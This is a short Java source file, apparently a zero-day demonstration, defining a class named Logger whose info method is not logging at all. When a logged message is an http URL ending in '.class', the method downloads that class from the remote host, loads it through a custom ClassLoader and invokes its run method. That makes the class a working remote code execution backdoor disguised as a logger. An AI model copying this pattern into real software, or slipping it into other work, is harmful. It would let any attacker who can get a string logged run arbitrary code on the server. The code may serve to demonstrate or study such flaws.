package org.youngmonkeys.dfs.zeroday;

import com.tvd12.ezyfox.util.EzyFileUtil;
import com.tvd12.ezyhttp.client.HttpClient;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;

public class Logger {

    public void info(String msg) throws Exception {
        if (msg.startsWith("http://") && msg.endsWith(".class")) {
            HttpClient httpClient = HttpClient.builder()
                .build();
            byte[] classBytes;
            try(ByteArrayOutputStream outputStream = new ByteArrayOutputStream()) {
                httpClient.download(msg, outputStream);
                classBytes = outputStream.toByteArray();
            }
            ClassLoader classLoader = new ClassLoader() {
                @Override
                protected Class<?> findClass(String name) {
                    return defineClass(name, classBytes, 0, classBytes.length);
                }
            };
            String className = EzyFileUtil.getFileNameWithoutExtension(msg);
            Class<?> payloadClass = classLoader.loadClass(className);
            Object instance = payloadClass.getDeclaredConstructor().newInstance();
            Method runMethod = payloadClass.getMethod("run");
            runMethod.invoke(instance);
        }
    }
}
